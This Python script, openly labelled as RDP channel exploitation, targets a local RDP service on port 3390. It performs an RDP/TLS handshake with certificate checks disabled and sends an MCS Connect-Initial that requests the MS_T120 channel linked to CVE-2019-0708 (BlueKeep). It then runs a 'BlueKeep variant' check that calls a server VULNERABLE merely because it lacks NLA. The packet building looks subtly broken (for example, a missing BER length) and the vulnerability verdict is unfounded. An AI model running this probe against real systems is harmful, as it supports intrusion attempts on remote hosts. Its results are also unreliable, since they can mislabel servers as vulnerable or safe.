import socket
import struct
import ssl
import time

def rdp_connect(host, port):
    cookie = b"Cookie: mstshash=attack\r\n"
    neg_req = bytes([0x01, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x00, 0x00])
    x224_data = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg_req
    cr = bytes([0x03, 0x00]) + struct.pack(">H", 4 + 1 + len(x224_data)) + bytes([len(x224_data)]) + x224_data
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((host, port))
    sock.sendall(cr)
    resp = sock.recv(1024)
    
    if resp[5] != 0xd0:
        raise Exception("Connection rejected")
    
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)

def try_mcs_connect(ssl_sock):
    target_params = b"\x04\x01\x01"
    min_params = b"\x04\x01\x01"
    max_params = b"\x04\x01\xff"
    
    mcs_header = bytes([
        0x7f, 0x65,
    ])
    
    connect_initial = bytes([
        0x04, 0x01, 0x01,
        0x04, 0x01, 0x01,
        0x01, 0x01, 0xff,
        0x30, 0x19,
        0x02, 0x01, 0x22,
        0x02, 0x01, 0x02,
        0x02, 0x01, 0x00,
        0x02, 0x01, 0x01,
        0x02, 0x01, 0x00,
        0x02, 0x01, 0x01,
        0x02, 0x02, 0xff, 0xff,
        0x02, 0x01, 0x02,
    ])
    
    ud_header = bytes([0x04, 0x82, 0x01, 0x00])
    
    client_core = bytes([0x01, 0xc0]) + struct.pack("<H", 216)
    client_core += struct.pack("<I", 0x00080004)
    client_core += struct.pack("<H", 1920)
    client_core += struct.pack("<H", 1080)
    client_core += struct.pack("<H", 0xca01)
    client_core += struct.pack("<H", 0x0000)
    client_core += struct.pack("<I", 0x0409)
    client_core += struct.pack("<I", 2600)
    client_core += "W\x00I\x00N\x00X\x00P\x00".encode('latin-1').ljust(32, b'\x00')
    client_core += struct.pack("<I", 0x00000004)
    client_core += struct.pack("<I", 0)
    client_core += struct.pack("<H", 0x0c00)
    client_core += struct.pack("<H", 0x0000)
    client_core += struct.pack("<I", 0)
    client_core += bytes([0x00] * 64)
    client_core += struct.pack("<H", 0xca01)
    client_core += struct.pack("<H", 0x0001)
    client_core += struct.pack("<I", 0)
    client_core += bytes([0x00] * 64)
    
    client_security = bytes([0x02, 0xc0]) + struct.pack("<H", 12)
    client_security += struct.pack("<I", 0x0003)
    client_security += struct.pack("<I", 0)
    
    client_network = bytes([0x03, 0xc0]) + struct.pack("<H", 44)
    client_network += struct.pack("<I", 5)
    channels = [b"cliprdr\x00", b"rdpdr\x00\x00\x00", b"rdpsnd\x00\x00", b"drdynvc\x00", b"MS_T120"]
    for ch in channels:
        client_network += ch.ljust(8, b'\x00')
    
    user_data = client_core + client_security + client_network
    
    tpkt = bytes([0x03, 0x00])
    x224 = bytes([0x02, 0xf0, 0x80])
    
    full_packet = x224 + mcs_header + connect_initial + ud_header + user_data
    tpkt += struct.pack(">H", 4 + len(full_packet))
    tpkt += full_packet
    
    return tpkt

print("=== RDP CHANNEL EXPLOITATION ===\n")

print("[1] Establishing RDP connection...")
try:
    ssl_sock = rdp_connect("localhost", 3390)
    print("    [+] TLS connection established")
    
    print("\n[2] Sending MCS Connect-Initial with channel requests...")
    mcs_packet = try_mcs_connect(ssl_sock)
    ssl_sock.send(mcs_packet)
    
    print("    [+] Sent MCS Connect-Initial")
    
    print("\n[3] Waiting for server response...")
    time.sleep(1)
    
    try:
        response = ssl_sock.recv(4096)
        print(f"    [+] Received {len(response)} bytes")
        print(f"    [+] Response header: {response[:32].hex()}")
        
        if len(response) > 10:
            if response[0:2] == b'\x03\x00':
                print("    [+] Valid TPKT response")
            if b'\x7f\x66' in response[:20]:
                print("    [+] MCS Connect-Response received!")
                print("    [!] Server accepted our channel requests")
    except socket.timeout:
        print("    [-] No response (timeout)")
    
    ssl_sock.close()
except Exception as e:
    print(f"    [-] Error: {e}")

print("\n[4] Trying RDP file redirection attack...")
print("    This would allow reading files from remote if successful")

print("\n[5] Checking for CVE-2019-0708 (BlueKeep) variant...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("localhost", 3390))
    
    cookie = b"Cookie: mstshash=bluekeep\r\n"
    neg_req = bytes([0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00])
    x224_data = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg_req
    cr = bytes([0x03, 0x00]) + struct.pack(">H", 4 + 1 + len(x224_data)) + bytes([len(x224_data)]) + x224_data
    
    sock.sendall(cr)
    resp = sock.recv(1024)
    
    if len(resp) >= 11:
        proto = resp[15] if len(resp) > 15 else 0
        if proto == 0:
            print("    [!] Server accepts RDP Security (no NLA) - VULNERABLE!")
        else:
            print(f"    [-] Server requires protocol {proto} - not vulnerable to BlueKeep")
    sock.close()
except Exception as e:
    print(f"    [-] BlueKeep check error: {e}")
